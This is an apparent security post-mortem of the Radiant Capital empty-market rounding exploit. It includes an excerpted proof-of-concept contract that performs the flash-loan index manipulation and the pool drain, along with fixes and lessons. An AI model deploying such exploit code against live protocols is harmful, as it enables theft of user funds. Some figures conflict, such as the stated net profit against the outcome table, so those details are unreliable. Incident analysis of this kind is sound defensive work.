# Radiant Capital — Empty USDC Market Rounding Error Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-02 |
| **Protocol** | Radiant Capital |
| **Chain** | Arbitrum |
| **Loss** | ~$4,500,000 |
| **Attacker** | [0x826d...dE6D](https://arbiscan.io/address/0x826d5f4d8084980366f975e10db6c4cf1f9dde6d) |
| **Attack Contract** | [0x3951...aA8F](https://arbiscan.io/address/0x39519c027b503f40867548fb0c890b11728faa8f) |
| **Attack Tx** | [0x1ce7...c7b](https://arbiscan.io/tx/0x1ce7e9a9e3b6dd3293c9067221ac3260858ce119ecb7ca860eac28b2474c7c9b) |
| **Vulnerable Contract** | [0xF4B1...59E1](https://arbiscan.io/address/0xf4b1486dd74d07706052a33d31d7c0aafd0659e1) (Radiant LendingPool) |
| **Root Cause** | Manipulation of `liquidityIndex` to an extreme value by exploiting `rayDiv` rounding errors in the newly deployed, empty USDC market |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol) |

---

## 1. Vulnerability Overview

Radiant Capital is a lending protocol forked from the Aave V3 codebase. On January 2, 2024, the attacker exploited the initial state of a newly deployed USDC market (zero deposits, `totalSupply = 0`).

The core vulnerability consists of two layers:

1. **`rayDiv` Rounding Error (Precision Loss)**: Aave/Radiant's `rayDiv` function applies rounding during `a * RAY / b` operations. When the pool is completely empty (`liquidityIndex = 1 RAY`, `totalDeposits ≈ 0`), repeatedly executing flash loans can incrementally inflate the index.

2. **Empty Market Exploit**: In a newly created market with zero deposits, the denominator in the `liquidityIndex` update is extremely small, causing rounding errors to amplify with each flash loan cycle and driving the index to astronomical values.

By combining these two factors, the attacker:
- Manipulated `liquidityIndex` to an extreme value via 151 repeated flash loans
- Used the distorted collateral value (based on the manipulated index) to borrow an excessive amount of WETH
- Completely drained the remaining USDC from the pool using a separate `HelperExploit` contract via repeated deposit/withdraw cycles

---

## 2. Vulnerable Code Analysis

### 2.1 `rayDiv` Rounding Error (Core Vulnerability)

The `rayDiv` function from the `WadRayMath` library inherited from Aave V3:

```solidity
// ❌ Vulnerable code — rounding error amplified in empty market
uint256 internal constant RAY = 1e27;
uint256 internal constant HALF_RAY = 0.5e27;

function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    // When b is very small (newly empty market), the +HALF_RAY rounding
    // bumps the result up by 1 RAY per call.
    // Errors accumulate with repeated flash loans.
    return (a * RAY + HALF_RAY) / b;
    // ❌ When b is small, the index increases by +1 RAY per call
}
```

**Difference between a normal market and a newly empty market**:

| Situation | `b` (total liquidity) | Impact of rounding error |
|------|----------------|----------------|
| Normal market (sufficient liquidity) | Hundreds of millions USD scale | Negligible |
| Newly empty market (zero deposits) | ≈ 0 or minimum value | Index amplified by +1 RAY per flash loan |

**Vulnerable index update logic**:

```solidity
// ❌ Vulnerable liquidityIndex update (estimated ReserveLogic.sol)
function updateState(DataTypes.ReserveData storage reserve, ...) internal {
    uint256 previousLiquidityIndex = reserve.liquidityIndex;
    uint256 currentLiquidityRate = reserve.currentLiquidityRate;
    
    // rayDiv is called when reflecting flash loan fees
    // In an empty market, rounding errors accumulate and cause the index to explode
    uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(
        currentLiquidityRate, 
        reserve.lastUpdateTimestamp
    );
    
    // ❌ Rounding error occurs in this multiply + divide operation
    reserve.liquidityIndex = cumulatedLiquidityInterest.rayMul(previousLiquidityIndex);
    // After 151 iterations in an empty market, liquidityIndex → extremely large value
}
```

**Fixed code**:

```solidity
// ✅ Fix 1: Enforce minimum deposit for new markets
function initReserve(address asset, ...) external {
    // Require minimum deposit (same principle as first depositor attack prevention)
    require(MINIMUM_INITIAL_LIQUIDITY > 0, "Empty market not allowed");
    // Protocol deposits the minimum amount itself before activating the market
    _deposit(asset, MINIMUM_INITIAL_LIQUIDITY, address(this), 0);
}

// ✅ Fix 2: Limit index updates during flash loans
function flashLoan(...) external {
    uint256 indexBefore = reserve.liquidityIndex;
    // ... flash loan execution ...
    // ✅ Cap the index change within a single transaction
    require(
        reserve.liquidityIndex <= indexBefore * MAX_INDEX_MULTIPLIER,
        "Index manipulation detected"
    );
}
```

### 2.2 Empty Market Flash Loan Abuse

```solidity
// ❌ Vulnerable flash loan state update
function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    ...
) external {
    // ❌ liquidityIndex updated after flash loan completes
    // rayDiv rounding errors accumulate in empty market where totalLiquidity ≈ 0
    _reserves[asset].updateState(reserveCache);
    // After 151 iterations, liquidityIndex exceeds normal bounds
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA (`0x826d...dE6D`) deploys attack contract (`0x3951...aA8F`)
- Target: newly deployed Radiant USDC market (`rUSDCn`, `totalSupply = 0`)
- No upfront capital required — attack is possible using only flash loans

### 3.2 Execution Phase

**Phase 1 — Obtain funds via external Aave V3 flash loan**

1. Request **3,000,000 USDC** flash loan from Aave V3 Pool
2. Enter `executeOperation` callback

**Phase 2 — `liquidityIndex` manipulation (151 iterations)**

3. Deposit **2,000,000 USDC** into Radiant USDC market → receive rUSDCn
4. Repeatedly borrow/repay **2,000,000 USDC** via Radiant's internal flash loan (151 times)
   - Each cycle, `rayDiv` rounding causes a small increase to `liquidityIndex`
   - After 151 cumulative iterations, `liquidityIndex` is manipulated to an extreme value

**Phase 3 — Excessive WETH borrowing based on manipulated index**

5. Recalculate collateral value based on manipulated `liquidityIndex`
6. Borrow **~90.69 WETH** from Radiant (exceeding actual collateral value)
7. Transfer rUSDCn balance to `HelperExploit` contract

**Phase 4 — Complete USDC pool drain via HelperExploit**

8. Repeatedly call `HelperExploit.siphonFundsFromPool()`:
   - Deposit USDC → rUSDCn balance exceeds actual value due to rounding errors
   - Immediately withdraw → repeat to extract remaining USDC from pool
9. HelperExploit returns **~2,815,400 USDC** to attack contract

**Phase 5 — Swap via Uniswap V3 and repay Aave**

10. Swap 2 WETH via Uniswap V3 WETH/USDC pool (sell USDC)
11. Reverse-swap 3,232.56 USDC
12. Repay Aave flash loan: **3,001,500 USDC** (principal 3M + fee 1,500)
13. Net profit: **~$4,500,000 (USDC + WETH equivalent)**

### 3.3 Attack Flow Diagram

```
Attacker EOA (0x826d...dE6D)
        │
        ▼
┌───────────────────────────────┐
│  [1] Aave V3 Flash Loan       │
│      3,000,000 USDC           │
└───────────────┬───────────────┘
                │ executeOperation callback
                ▼
┌───────────────────────────────┐
│  [2] Deposit to Radiant USDC  │
│      2,000,000 USDC → rUSDCn  │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────────────────────────────┐
│  [3] Radiant Internal Flash Loan Loop (×151)           │
│                                                        │
│  ┌─────────────────────────────────────────────────┐  │
│  │  flashLoan(2M USDC) → executeOperation callback │  │
│  │  └─ Transfer rUSDCn balance → withdraw(rUSDCn-1)│  │
│  │     ↑ rayDiv rounding error accumulates         │  │
│  │     ↑ liquidityIndex increases slightly         │  │
│  └─────────────────────────────────────────────────┘  │
│              ×151 iterations                           │
│  Result: liquidityIndex → extreme value               │
└───────────────┬───────────────────────────────────────┘
                │
                ▼
┌───────────────────────────────┐
│  [4] Excessive WETH Borrow    │
│      ~90.69 WETH borrowed     │
│  (collateral calc based on    │
│   manipulated index)          │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────────────────────────────┐
│  [5] HelperExploit.siphonFundsFromPool()              │
│                                                        │
│  ┌────────────────────────────────────────────────┐   │
│  │  deposit(2×amount) → receive rUSDCn            │   │
│  │  withdraw(1.5×amount - 1)                      │   │
│  │  ↑ Distorted index allows withdrawing more     │   │
│  │    USDC than deposited                         │   │
│  └────────────────────────────────────────────────┘   │
│              Repeat (until pool balance < 1 USDC)     │
│  Result: ~2,815,400 USDC extracted                    │
└───────────────┬───────────────────────────────────────┘
                │
                ▼
┌───────────────────────────────┐
│  [6] Uniswap V3 Swap          │
│  WETH → USDC (realize profit) │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│  [7] Repay Aave Flash Loan    │
│  3,001,500 USDC (principal    │
│  + fee)                       │
└───────────────────────────────┘
                │
                ▼
        Net profit ~$4,500,000
```

### 3.4 Outcome

| Item | Amount |
|------|------|
| Aave flash loan (principal) | 3,000,000 USDC |
| Aave flash loan fee | 1,500 USDC (0.05%) |
| WETH borrowed | ~90.69 WETH (~$200,000) |
| USDC extracted | ~2,815,400 USDC |
| Aave repayment | 3,001,500 USDC |
| **Net profit (estimated)** | **~$4,500,000** |

---

## 4. PoC Code (Core Logic Excerpted from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Attack contract key constants
// Vulnerable contract: Radiant LendingPool (Aave V3 fork)
IRadiant private constant RadiantLendingPool = 
    IRadiant(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);

// [Step 1] Initiate 3M USDC flash loan from Aave V3
function testExploit() public {
    operationId = 1;  // First callback = main attack logic
    bytes memory params = abi.encode(
        address(RadiantLendingPool), address(rUSDCn), address(rWETH),
        address(WETH_USDC), uint256(1), uint256(0)
    );
    // Request 3,000,000 USDC flash loan from Aave V3
    takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);
}

function executeOperation(...) external returns (bool) {
    if (operationId == 1) {
        // [Step 2] Deposit 2M USDC into Radiant (receive rUSDCn)
        USDC.approve(address(RadiantLendingPool), type(uint256).max);
        RadiantLendingPool.deposit(address(USDC), 2_000_000 * 1e6, address(this), 0);
        
        operationId = 2;  // Subsequent callbacks = internal flash loan handling
        
        // [Step 3] Repeat Radiant internal flash loan 151 times
        // ❌ Key: each iteration, rayDiv rounding error → liquidityIndex increases
        uint8 i;
        while (i < 151) {
            // Request flash loan from Radiant itself (index manipulation cycle)
            takeFlashLoan(address(RadiantLendingPool), 2_000_000 * 1e6, 
                         abi.encode(type(uint256).max));
            ++i;
        }
        
        // [Step 4] Borrow excessive WETH based on manipulated liquidityIndex
        // Extreme liquidityIndex → distorted collateral calculation
        uint256 amountToBorrow = 90_690_695_360_221_284_999; // ~90.69 WETH
        RadiantLendingPool.borrow(address(WETH), amountToBorrow, 2, 0, address(this));
        
        // [Step 5] Fully drain pool via HelperExploit
        uint256 transferAmount = rUSDCn.balanceOf(address(this));
        HelperExploit helper = new HelperExploit();
        USDC.approve(address(helper), type(uint256).max);
        // ❌ Repeated deposit/withdraw with distorted index → pool drain
        helper.siphonFundsFromPool(transferAmount);
        
        // [Step 6] Swap WETH→USDC via Uniswap V3 (realize profit)
        WETH.approve(address(WETH_USDC), type(uint256).max);
        USDC.approve(address(WETH_USDC), type(uint256).max);
        WETH_USDC.swap(address(this), true, 2e18, MIN_SQRT_RATIO + 1, "");  // WETH→USDC
        WETH_USDC.swap(address(this), false, 3_232_558_736, MAX_SQRT_RATIO - 1, ""); // USDC→WETH
        
    } else if (operationId == 2) {
        // [Internal flash loan callback] Transfer rUSDCn balance then withdraw
        operationId = 3;
        uint256 rUSDCnBalance = rUSDCn.balanceOf(address(this));
        // ❌ Transfer rUSDCn directly to rUSDCn contract → triggers index distortion
        USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
        // Withdraw rUSDCn - 1 → rounding error allows withdrawing more than deposited
        RadiantLendingPool.withdraw(address(USDC), rUSDCnBalance - 1, address(this));
    }
    
    // [Step 7] Approve Aave flash loan (handle repayment)
    USDC.approve(address(AaveV3Pool), type(uint256).max);
    return true;
}

// [HelperExploit] Fully drain remaining USDC via repeated deposit/withdraw
function siphonFundsFromPool(uint256 amount) external {
    USDC.transferFrom(msg.sender, address(this), amount << 1); // Receive 2×amount
    USDC.approve(address(RadiantLendingPool), type(uint256).max);
    bool depositSingleAmount;
    
    while (true) {
        // Exit when pool USDC balance reaches 0
        if (USDC.balanceOf(address(rUSDCn)) < 1) { break; }
        
        // First iteration: deposit 2×amount; subsequent: deposit amount each time
        if (depositSingleAmount) {
            RadiantLendingPool.deposit(address(USDC), amount, address(this), 0);
        } else {
            RadiantLendingPool.deposit(address(USDC), amount << 1, address(this), 0);
            depositSingleAmount = true;
        }
        
        uint256 poolBalance = USDC.balanceOf(address(rUSDCn));
        if (poolBalance > ((amount * 3) >> 1) - 1) {
            // ❌ Withdraw 1.5×amount - 1 (distorted index allows withdrawing more than deposited)
            RadiantLendingPool.withdraw(address(USDC), ((amount * 3) >> 1) - 1, address(this));
        } else {
            // Final round: withdraw all remaining balance
            RadiantLendingPool.withdraw(address(USDC), poolBalance, address(this));
            USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `rayDiv` rounding error — cumulative amplification in empty market | CRITICAL | CWE-682 (Incorrect Calculation) | `05_integer_issues.md` |
| V-02 | Absence of minimum liquidity for new markets (Empty Market) | CRITICAL | CWE-20 (Improper Input Validation) | `17_staking_reward.md` (First Depositor) |
| V-03 | Unrestricted index manipulation within flash loans | HIGH | CWE-400 (Uncontrolled Resource Consumption) | `02_flash_loan.md` |
| V-04 | Nested flash loans within a single transaction | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) | `16_accounting_sync.md` |

### V-01: rayDiv Rounding Error — Cumulative Amplification in Empty Market

- **Description**: The `WadRayMath.rayDiv(a, b)` function in the Aave V3 fork rounds via `(a * RAY + HALF_RAY) / b`. When the pool is completely empty (`totalScaledDeposits ≈ 0`), the denominator `b` becomes extremely small, causing the `+HALF_RAY` correction to bump the index by 1 RAY per flash loan cycle. After 151 iterations, the index far exceeds normal bounds.
- **Impact**: `liquidityIndex` manipulation → distorted collateral value calculation → borrowing beyond actual collateral value and full pool drain
- **Attack Conditions**: Newly created market with zero deposits + ability to execute repeated flash loans

### V-02: Absence of Minimum Liquidity for New Markets

- **Description**: When activating a new asset market in an Aave V3 fork protocol, no minimum initial liquidity is required. This is structurally identical to the "First Depositor" attack found in Compound V2/Aave V2. Mathematical invariants break when `totalSupply = 0`.
- **Impact**: Index calculations become unstable, allowing the attacker to exploit the minimum-denominator condition
- **Attack Conditions**: Immediately after new market deployment, before the first deposit, or when the pool is completely empty

### V-03: Unrestricted Index Manipulation Within Flash Loans

- **Description**: Flash loans for the same market can be called an arbitrary number of times within a single transaction. Each call executes `updateState()`, enabling cumulative index manipulation.
- **Impact**: Attacker can inflate the index to any desired level, completely distorting collateral calculations
- **Attack Conditions**: Re-entrant-style flash loans permitted on the same market

### V-04: Nested Flash Loans Within a Single Transaction

- **Description**: Radiant's own flash loans can be re-invoked from within an Aave flash loan callback. This nesting makes internal state synchronization difficult, and the index is updated continuously during callbacks.
- **Impact**: Accounting state enters an inconsistent state within a single transaction
- **Attack Conditions**: Protocol's own flash loan re-invocation permitted from within an external flash loan callback

---

## 6. Remediation Recommendations

### Immediate Actions

**[Action 1] Enforce minimum initial liquidity for new markets**

```solidity
// ✅ Protocol deposits minimum amount directly when activating a market
uint256 constant MINIMUM_INITIAL_SUPPLY = 1000; // e.g. 0.001 USDC (dust amount)

function initReserveWithMinLiquidity(
    address asset,
    address aTokenAddress,
    ...
) external onlyPoolConfigurator {
    // Existing initialization logic
    _initReserve(asset, aTokenAddress, ...);
    
    // ✅ Deposit minimum liquidity (prevents First Depositor attack)
    IERC20(asset).safeTransferFrom(
        msg.sender, 
        address(this), 
        MINIMUM_INITIAL_SUPPLY
    );
    _deposit(asset, MINIMUM_INITIAL_SUPPLY, address(this), 0);
}
```

**[Action 2] Cap index change rate during flash loans**

```solidity
// ✅ Validate index change at flash loan start/end
function flashLoan(...) external {
    uint256 indexBefore = _reserves[assets[0]].liquidityIndex;
    
    // ... flash loan execution ...
    
    // ✅ Limit index change to no more than 1% within a single transaction
    uint256 indexAfter = _reserves[assets[0]].liquidityIndex;
    require(
        indexAfter <= indexBefore * 101 / 100,
        "Index change exceeds limit in single transaction"
    );
}
```

**[Action 3] Add minimum denominator validation to `rayDiv`**

```solidity
// ✅ Prevent rounding errors when denominator is extremely small
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    // ✅ Validate minimum denominator (prevents division by zero + near-zero values)
    require(b >= MINIMUM_DENOMINATOR, "Denominator too small: precision risk");
    return (a * RAY + b / 2) / b;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: rayDiv rounding | Minimum denominator validation + cumulative index change monitoring |
| V-02: Empty market | Mandate protocol-seeded minimum liquidity deposit on market activation |
| V-03: Unrestricted flash loans | Limit flash loan count per market per transaction (e.g. max 1) |
| V-04: Nested flash loans | Block re-entry of own flash loans within external flash loan callbacks (`nonReentrant`) |

---

## 7. Lessons Learned

1. **Include a minimum liquidity step in new market deployment procedures**: In lending protocols, a `totalSupply = 0` state is a special condition where mathematical invariants break. Compound V2 and Aave V2 both suffered from the same structural "First Depositor" issue. When activating a market, the protocol itself should deposit a small amount to ensure the denominator never reaches zero.

2. **Forked protocols must continuously track and apply upstream security fixes**: Radiant forked Aave V3 but omitted mathematical safeguards that Aave subsequently improved. A systematic process for tracking the original protocol's security patches after forking is essential.

3. **Flash loans can be a vector for index manipulation**: Flash loans can be used beyond simple liquidity provision — they can serve as tools for state manipulation. If internal indexes/rates are updated on each flash loan cycle, the cumulative effect of repeated calls must be validated.

4. **Make the assumptions of math libraries explicit**: `rayDiv` was designed under the assumption that the denominator is "sufficiently large." There was no defensive code for edge cases where this assumption breaks (e.g., newly empty markets). It is good practice to explicitly validate preconditions of internal math functions using `require`.

5. **Limit the number of repeated identical operations within a single transaction**: 151 flash loan iterations were possible within a single transaction. If a guard had been in place to restrict flash loan re-entry or repetition on the same asset, this attack would have been impossible.

6. **New asset market deployment must go through a mandatory security review gate**: Code that was safe in existing markets can become vulnerable in the special initial state of a new market (empty pool). New market deployments should go through a dedicated security checklist and audit.

---

## 8. On-Chain Verification

On-chain transaction analysis results (direct Arbitrum RPC query)

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Aave flash loan size | 3,000,000 USDC | 3,000,000 USDC | ✅ |
| Radiant deposit amount | 2,000,000 USDC | 2,000,000 USDC | ✅ |
| Flash loan iteration count | 151 | 151 (log pattern confirmed) | ✅ |
| WETH borrowed | 90,690,695,360,221,284,999 wei | ~90.69 WETH (log confirmed) | ✅ |
| Aave repayment | 3,001,500 USDC (principal + fee) | 3,001,500 USDC | ✅ |
| Total log count | — | 833 (395 Transfer events) | — |

### 8.2 Key On-Chain Event Log Sequence

```
[Log 0-1]   Aave V3 Pool → Attack contract: 3,000,000 USDC transferred (flash loan)
[Log 2-3]   Attack contract → rUSDCn: 2,000,000 USDC deposited (Radiant deposit)
[Log 4-397] Radiant flash loan 151 iterations:
               - USDC: rUSDCn ↔ Attack contract (2,000,000 USDC round-trip)
               - Each cycle: deposit 2,000,000 → withdraw 1,999,999 or 2,001,800 (rounding error visible)
[Log 398]   rWETH → Attack contract: 90.69 WETH (Radiant borrow)
[Log 399-820] HelperExploit repeated deposit/withdraw:
               - 271,800 → 407,700 USDC alternating (index-distorted drain)
[Log 821]   HelperExploit → Attack contract: 2,815,400 USDC returned
[Log 822]   Attack contract → Uniswap V3: 2 WETH (swap)
[Log 825]   Uniswap V3 → Attack contract: 1.3647 WETH returned
[Log 826]   Attack contract → Uniswap V3: 3,232 USDC (reverse swap)
[Log 830]   Attack contract → Aave V3: 3,001,500 USDC (flash loan repayment)
[Log 832]   Attack contract → 0x0000: 90.055 WETH (WETH burn → sent to address 0)
```

> Note: No direct USDC/WETH transfers to the attacker address (0x826d) were observed in the on-chain logs. Profits are presumed to have remained inside the attack contract (0x3951) in USDC form, or to have been withdrawn in a separate subsequent transaction.

### 8.3 Precondition Verification

| Condition | Before Attack (Block 166405686) | Note |
|------|--------------------------|------|
| rUSDCn totalSupply | 0 | ✅ Empty market confirmed |
| rUSDCn USDC balance | 0 | ✅ Newly deployed market confirmed |
| Attacker USDC balance | 0 (EOA basis) | Attack contract is separate |
| Attack block | 166,405,687 | PoC `blocknumToForkFrom = 166,405,686` +1 |

---

## References

- [Neptune Mutual Analysis](https://neptunemutual.com/blog/how-was-radiant-capital-exploited/)
- [BeosinAlert Twitter](https://twitter.com/BeosinAlert/status/1742389285926678784)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol)
- [Attack Transaction](https://arbiscan.io/tx/0x1ce7e9a9e3b6dd3293c9067221ac3260858ce119ecb7ca860eac28b2474c7c9b)